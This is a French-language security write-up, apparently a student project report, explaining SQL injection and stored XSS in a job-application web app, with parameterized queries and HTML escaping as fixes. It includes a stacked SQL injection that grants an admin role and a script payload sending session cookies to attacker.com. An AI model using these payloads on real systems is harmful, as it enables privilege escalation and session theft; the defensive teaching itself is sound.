# Injection SQL

Dans une situation où l'application prend un email comme entrée pour rechercher un utilisateur dans la base de données, nous avons :

```sql
SELECT * FROM Utilisateurs WHERE email = '[email]'
```

Une injection SQL possible pourrait ressembler à ce qui suit, avec `alix@utc.fr' --` comme entrée :

```sql
SELECT * FROM Utilisateurs WHERE email = 'alix@utc.fr' --'
```

Ici, le `--` est un commentaire en SQL qui fait ignorer tout ce qui suit. Ainsi, cette requête récupère tous les détails de l'utilisateur avec l'email "alix", en ignorant la vérification du mot de passe ou d'autres contraintes qui peuvent être présentes dans la requête originale.

Pour modifier les rôles, un attaquant pourrait injecter une requête telle que :

```sql
alix@utc.fr'; UPDATE Utilisateurs SET role = 'Administrateur' WHERE email = 'alix@utc.fr
```

Ce qui aboutirait à la requête suivante :

```sql
SELECT * FROM Utilisateurs WHERE email = 'alix'; UPDATE Utilisateurs SET role = 'Administrateur' WHERE email = 'alix'
```

Cela changerait le rôle de l'utilisateur "alix" en "Administrateur".

Pour prévenir les injections SQL, il faut utiliser des requêtes paramétrées (aussi appelées requêtes préparées). Voici un exemple avec MySQL en Node.js :

``````js
read: function (email, callback) {
    db.query("SELECT * FROM Utilisateurs WHERE email= ?", [email], function
        (err, results) {
        if (err) throw err;
        callback(results);
    });
}

``````


# Cross-Site Scripting

Pour une attaque XSS, nous avons la fonctionnalité d'envoyer des candidatures accompagnées par un message que l'utilisateur peut écrire lui même. Lorsqu'un utilisateur soumet un message, nous le stockons dans la base de données, puis on l'affichez sur la page des recruteurs en insérant directement le message dans le HTML de la page.

C'est là que se trouve la faille. Si un utilisateur malveillant soumet un message de candidature comme celui-ci :

```html
<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie;</script>
```

Le script sera exécuté chaque fois qu'un utilisateur charge la candidature. Le script redirige l'utilisateur vers un site contrôlé par l'attaquant et y envoie le cookie de l'utilisateur en tant que paramètre d'URL. Si vous utilisez des cookies pour les sessions d'utilisateurs, l'attaquant peut ainsi voler la session de l'utilisateur et usurper son identité.

Pour éviter cela, on doit correctement échappé le texte avant de l'afficher sur votre site. Cela signifie que les caractères spéciaux tels que `<` et `>` doivent être remplacés par leurs équivalents HTML, soit `&lt;` et `&gt;`. Cela empêche le navigateur d'interpréter le contenu comme du code HTML ou JavaScript.

Dans notre cas, nous utilisons la bibliothèque `escape-html`, voici un exemple d'utilisation :

```javascript
const escapeHtml = require('escape-html');

let candidature = getCandidature("alix@utc.fr"); // On récupere une candidature
let safeComment = escapeHtml(candidature.comment); // On échappe le texte

response.send(`<p>${safeComment}</p>`);
```

Dans cet exemple, si un utilisateur soumet le commentaire de script malveillant mentionné ci-dessus, il sera affiché sur la page en tant que texte brut, et non exécuté en tant que script.